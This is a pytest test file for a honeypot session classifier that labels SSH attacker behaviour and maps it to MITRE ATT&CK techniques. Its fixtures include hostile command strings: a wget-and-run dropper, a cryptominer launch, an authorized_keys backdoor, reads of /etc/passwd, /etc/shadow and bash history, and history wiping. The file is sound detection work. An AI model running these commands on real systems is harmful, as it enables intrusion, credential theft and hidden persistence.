import json
from analysis.classifier import classify, classify_all, Thresholds
from analysis.attack_map import techniques, export_navigator
from genno.telemetry.ingest import ingest, load_sessions, save_labels


def S(**kw):
    base = dict(session_id="s", src_ip="1.1.1.1", start_ts=0, end_ts=1, duration=1, n_auth=0, login_success=False,
                client_version=None, interactive=False, creds=[], commands=[], downloads=[], file_reads=[])
    base.update(kw)
    return base

def logged(cmds, **kw):
    return S(n_auth=1, login_success=True, creds=[["root", "x", True]],
             commands=[[i * 0.01, c, "exec"] for i, c in enumerate(cmds)], **kw)


def test_labels():
    assert classify(S())[0] == "scanner"
    assert classify(S(n_auth=1, creds=[["a", "b", False]]))[0] == "auth_probe"
    assert classify(S(n_auth=4, creds=[["a", "b", False]] * 4))[0] == "brute_force"
    assert classify(logged([]))[0] == "login_only"
    assert classify(logged(["uname -a; id"]))[0] == "recon_bot"
    assert classify(logged(["cd /tmp; wget http://x/a; sh a"]))[0] == "malware_dropper"
    assert classify(logged(["echo hi"], downloads=["http://x"]))[0] == "malware_dropper"
    assert classify(logged(["./xmrig -o stratum+tcp://p"]))[0] == "cryptominer"
    assert classify(logged(["echo k >> ~/.ssh/authorized_keys"]))[0] == "persistence"
    assert classify(logged(["apt update"]))[0] == "post_login_other"


def test_priority_and_quoted_operators():
    assert classify(logged(["wget http://x/a; echo k >> ~/.ssh/authorized_keys"]))[0] == "malware_dropper"
    assert classify(logged(["echo 'a;wget'"]))[0] == "malware_dropper"        # regex is deliberately conservative
    assert classify(logged(["cat /etc/passwd | grep root | wc -l"]))[0] == "recon_bot"


def test_human_needs_interactive_and_slow_typing():
    slow = [[0, "ls", "shell"], [2.0, "pwd", "shell"], [4.5, "cat x", "shell"]]
    assert classify(S(n_auth=1, login_success=True, interactive=True, commands=slow))[0] == "human"
    assert classify(S(n_auth=1, login_success=True, interactive=False, commands=slow))[0] == "recon_bot"
    assert classify(S(n_auth=1, login_success=True, interactive=True, commands=slow), Thresholds(human_gap=5))[0] == "recon_bot"


def test_ip_campaign_relabels_one_shot_failures():
    probes = [S(session_id=f"p{i}", src_ip="9.9.9.9", n_auth=1, creds=[["a", "b", False]]) for i in range(5)]
    lone = S(session_id="x", src_ip="8.8.8.8", n_auth=1, creds=[["a", "b", False]])
    res = classify_all(probes + [lone])
    assert {res[f"p{i}"]["label"] for i in range(5)} == {"brute_force"} and res["x"]["label"] == "auth_probe"
    assert "T1110.001" in res["p0"]["techniques"] and "T1110.001" not in res["x"]["techniques"]


def test_attack_mapping():
    t = techniques(logged(["uname -a; whoami; ps aux; cat /etc/passwd; chmod +x x; rm x"], file_reads=["/etc/passwd", "/etc/shadow"]))
    assert {"T1078", "T1059.004", "T1082", "T1033", "T1057", "T1087.001", "T1003.008", "T1222.002", "T1070.004"} <= set(t)
    assert "T1105" not in t
    assert "T1552.003" in techniques(logged(["cat /root/.bash_history"]))
    assert "T1070.003" in techniques(logged(["history -c"]))


def test_navigator_layer(tmp_path):
    layer = export_navigator([["T1078", "T1105"], ["T1105"]], tmp_path / "l.json")
    assert layer["domain"] == "enterprise-attack" and layer["gradient"]["maxValue"] == 2
    assert {t["techniqueID"]: t["score"] for t in layer["techniques"]} == {"T1078": 1, "T1105": 2}


def test_ingest_roundtrip_and_robustness(tmp_path):
    ev = [{"ts": 1.0, "event_type": "connect", "session_id": "a", "src_ip": "1.1.1.1", "src_port": 1},
          {"ts": 1.1, "event_type": "auth_attempt", "session_id": "a", "src_ip": "1.1.1.1", "src_port": 1,
           "username": "root", "password": "p", "success": True, "client_version": "SSH-2.0-x"},
          {"ts": 2.0, "event_type": "command", "session_id": "a", "src_ip": "1.1.1.1", "src_port": 1, "command": "id", "mode": "exec"},
          {"ts": 2.1, "event_type": "download_attempt", "session_id": "a", "src_ip": "1.1.1.1", "src_port": 1, "url": "http://u"},
          {"ts": 3.0, "event_type": "disconnect", "session_id": "a", "src_ip": "1.1.1.1", "src_port": 1}]
    p = tmp_path / "e.jsonl"
    p.write_text("\n".join(json.dumps(e) for e in ev) + '\n{"ts": 4, "truncated\nnot json\n\n')
    assert ingest(str(p), str(tmp_path / "d.db")) == 1
    s = load_sessions(str(tmp_path / "d.db"))[0]
    assert s["login_success"] and s["duration"] == 2.0 and s["downloads"] == ["http://u"]
    assert s["commands"][0][1] == "id" and s["creds"] == [["root", "p", True]]
    save_labels(str(tmp_path / "d.db"), {"a": {"label": "recon_bot", "reasons": ["r"], "techniques": ["T1078"]}})
    assert load_sessions(str(tmp_path / "d.db"))[0]["label"] == "recon_bot"
